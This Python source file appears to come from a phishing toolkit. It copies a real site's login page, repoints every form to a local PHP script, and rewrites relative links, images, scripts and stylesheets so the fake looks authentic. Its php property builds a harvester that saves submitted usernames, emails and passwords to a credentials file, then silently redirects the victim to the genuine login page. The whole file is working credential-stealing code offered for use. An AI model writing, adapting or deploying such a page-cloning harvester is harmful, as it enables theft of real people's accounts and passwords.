# Date: 03/19/2018
# Author: Ethical-H4CK3R
# Description: Modify the source of a html

from re import sub 
from urlparse import urlparse
from threading import Thread, Lock
from bs4 import BeautifulSoup as bs 
from const import PHP_SCRIPT_FILE as login, CREDENTIALS_FILE as log, SYMBOL_SUBS as syms 

class Modifier(object):
 def __init__(self, html, login_url):
  self.html = html
  self.lock = Lock()
  self.login_url = login_url
  self.link = self.get_link(login_url)

 def add_subs(self):
  for sym in syms:
   self.html = sub('[{}]'.format(sym), syms[sym], self.html)

 def remove_subs(self):
  for sym in syms:
   self.html = sub(syms[sym], sym, self.html)
  
 def get_link(self, url):
  url_data = urlparse(url)
  return '{}://{}'.format(url_data.scheme, url_data.netloc)

 def inputs(self):
  inputs = []
  for _ in bs(self.html, 'lxml').findAll('input'):   
   try:
    if any([_['type'].lower() == 'text', _['type'].lower() == 'password', _['type'].lower() == 'email']):    
     if not _['name'] in inputs:inputs.append(_['name'])
   except:
    try:
     if any([_['autocomplete'].lower() == 'email', _['autocomplete'].lower() == 'username']):
      if not _['name'] in inputs:inputs.append(_['name'])
    except:pass 
  return inputs

 @property
 def source(self):
  flag = False
  self.add_subs()
  for i in bs(self.html, 'lxml').findAll('form'):
   try:
    if i['action'].strip():
     self.html = sub(i['action'], login, self.html)
    else:
     html = bs(self.html, 'lxml')
     html.find('form').attrs['action'] = login
     self.html = str(html)
   except:
    if not flag:
     html = bs(self.html, 'lxml')
     for _ in html.findAll('form'):
      _.attrs['action'] = login
      self.html = str(html)
     flag = True
  self.fix_tags()
  self.remove_subs()
  return self.html

 def fix_tags(self):
  self.fix_links()
  self.fix_images()
  self.fix_scripts()
  self.fix_css_links()
  
 def fix_css_links(self):
  self.change_source(sub(r'url\(/', 'url({}/'.format(self.link), self.html))

 def fix_links(self):
  for link in bs(self.html, 'lxml').findAll('link'):
   try:
    if all([not '//' in link['href'], not link['href'].endswith('.js')]):
     self.change_source(sub(link['href'], self.link+link['href'], self.html))
   except:pass 

 def fix_scripts(self):
  for script in bs(self.html, 'lxml').findAll('script'):
   try:
    if not '//' in script['src']:
     self.change_source(sub(script['src'], self.link+script['src'], self.html))
   except:pass 

 def fix_images(self):
  for img in bs(self.html, 'lxml').findAll('img')+bs(self.html, 'lxml').findAll('image'):
   try:
    if not '//' in img['src']:
     self.change_source(sub(img['src'], self.link+img['src'], self.html))
     self.change_source(sub(img['xlink:href'], self.link+img['xlink:href'], self.html))
   except:pass 

 def change_source(self, src):
  try:self.html = src 
  except:pass 

 @property
 def php(self):
  posts = ''
  fields = ''
  inputs = self.inputs()

  for _, field in enumerate(inputs):
   fields += '{}: %s\\n}}\\n\\n",'.format(field.title()) if _ == len(inputs)-1 else '{}: %s\\n '.format(field.title())
   post = '$_POST["{}"]'.format(field) if not '[' in field else '$_POST["{}"]["{}"]'.format(field.split('[')[0], field.split('[')[1].split(']')[0])
   posts += '{});'.format(post) if _ == len(inputs)-1 else '{}, '.format(post)

  file = '"{}";'.format(log)
  contents = 'file_put_contents($file, $data, FILE_APPEND);'
  meta = '<meta http-equiv="refresh" content="0; url={}"/>'.format(self.login_url)
  data = 'sprintf("Account Information {{\\n Url: {}\\n {} {}'.format(self.login_url, fields, posts)  
  return '<?php\n $data = {}\n $file = {}\n {}\n?>\n{}'.format(data, file, contents, meta)